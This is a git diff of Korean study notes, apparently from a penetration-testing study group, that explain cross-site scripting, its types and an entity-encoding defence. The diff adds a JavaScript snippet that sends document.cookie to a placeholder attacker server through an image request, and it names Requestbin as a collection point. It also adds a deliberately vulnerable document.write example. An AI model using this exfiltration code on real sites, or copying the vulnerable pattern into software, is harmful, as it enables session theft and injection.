@@ -8,9 +8,9 @@ title: "[WEB HACKING] XSS란?"
 excerpt: "모의해킹 취업반 스터디 7기 9주차"
 
 date: 2024-12-11
-last_modified_at: 2024-12-18
+last_modified_at: 2024-12-19
 
-tags: [TIL, WEB, DATABASE, SECURITY]
+tags: [TIL, WEB, SECURITY]
 ---
 
 # 목차
@@ -26,9 +26,24 @@ tags: [TIL, WEB, DATABASE, SECURITY]
 **XSS(Cross Site Scripting)** 공격은 `웹 사이트에 악성 스크립트를 삽입하는 공격`이다.  
 보통 클라이언트 측에서 악성 [스크립트](#footnote_1)<sup>1</sup>를 삽입해 다른 이용자의 브라우저에서 실행되게 만든다.  
 <a name='footnote_1'>[1] 클라이언트 스크립트: 이용자 브라우저에서 실행되는 스크립트로 HTML, CSS, JS 등이 있다.</a>
+~~검증할 때는 공격자, 피해자 역할로 직접 확인해보면 된다.~~
 
 ## 2. XSS 공격 방식
 XSS 공격 방식으로는 `Cookie Sniffing`, `스크립트 암호화 및 우회`, `악성 스크립트 유포`, `Key Logger`, `Mouse Sniffer`, `거짓 정보추가` 등이 있다.
+
+### Cookie Sniffing
+```js
+let cookieData = document.cookie;
+let img = new Image();
+img.src = "http://[공격자서버]/?cookie=" + cookieData;
+```
+JS 코드가 img 태그를 만든다  
+img 태그는 만들어지기 위해 src의 URL을 접속한다  
+담겨있는 URL은 공격자 서버에서 GET 방식의 request를 남긴다  
+
+* 공격자 서버
+    * VPS
+    * [Requestbin](https://public.requestbin.com/r/)
 
 ## 3. XSS 공격 유형
 1. Reflected XSS
@@ -59,11 +74,29 @@ e.g. 데이터베이스, 댓글창, 방문 로그, 회원가입 페이지, 게�
 서버에 스크립트를 저장하기 때문에 흔적이 남는다.  
 사용자가 악성 스크립트가 포함된 글을 접근하면 동작하기 때문에 공격 범위가 광범위하다.
 
-### 3.3. DOM Based XSS
+### 3.3. DOM Based XSS -> 브라우저에서 조립되는 script!
 피해자의 브라우저가 HTML 페이지를 분석해 **[DOM](#footnote_2)**<sup>2</sup>을 생성할 때 `악성 스크립트가 DOM의 일부로 구성되어 생성`되는 공격이다.  
+-> JS로 JS tag를 만들 수 있다.  
+-> 키워드: `document.write`, `innerHTML`  
 
 서버의 응답 내에서 악성 스크립트가 포함되지 않지만 브라우저의 응답 페이지에 정상적인 스크립트가 실행되면서 악성 스크립트가 추가되어 실행된다.  
 
+e.g.  
+```html
+<script>
+    function trackSearch(query) {
+        document.write(
+            "<img src='/resources/images/tracker.gif?searchTerms=" + query + "'>");
+    }
+
+    let query = (new URLSearchParams(window.location.search)).get('search');
+    if (query) {
+        trackSearch(query);
+    }
+</script>
+```
+  
+  ~~response의 JS 코드를 분석해야 한다.~~
 <a name='footnote_2'>[2] <b>DOM(Document Object Model, 문서 객체 모델)</b>: 웹페이지를 여는 즉시 생성되어 사용자가 서버와 상호 작용하지 않고도 페이지의 모든 콘텐츠에 엑세스할 수 있도록 돕는 프로그래밍 인터페이스이다.</a>
 
 ## 4. 공격 구문 예시
@@ -127,6 +160,9 @@ burp, param check, response에 같은 값 있나?
 3. 스크립트 입력하기  
 -> `<script>___<script>`
 
+## 6. 대응방안
+1. HTML 특수문자를 HTML Entity 표현 방법으로 치환하기
+
 # 참고
 * [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
 * [XSS란?](https://tibetsandfox.tistory.com/5)
@@ -135,3 +171,7 @@ burp, param check, response에 같은 값 있나?
 * [DOM-based XSS 1](https://portswigger.net/web-security/cross-site-scripting/dom-based)
 * [DOM-based XSS 2](https://owasp.org/www-community/attacks/DOM_Based_XSS)
 * [XSS(크로스 사이트 스크립트)란? 공격 유형부터 보안대책까지!](https://www.skshieldus.com/blog-security/security-trend-idx-06)
+* [[알아두면 유용한] 넷상의 쓰레기통들 - pastebin과 requestbin](https://domdom.tistory.com/38)
+* [Requestbin Development](https://glasses96.github.io/posts/24/)
+* [Request Capture like requestbin PHP](https://stackoverflow.com/questions/42685368/request-capture-like-requestbin-php)
+* [PHP-Micro-RequestBin](https://github.com/vinhch/PHP-Micro-RequestBin)
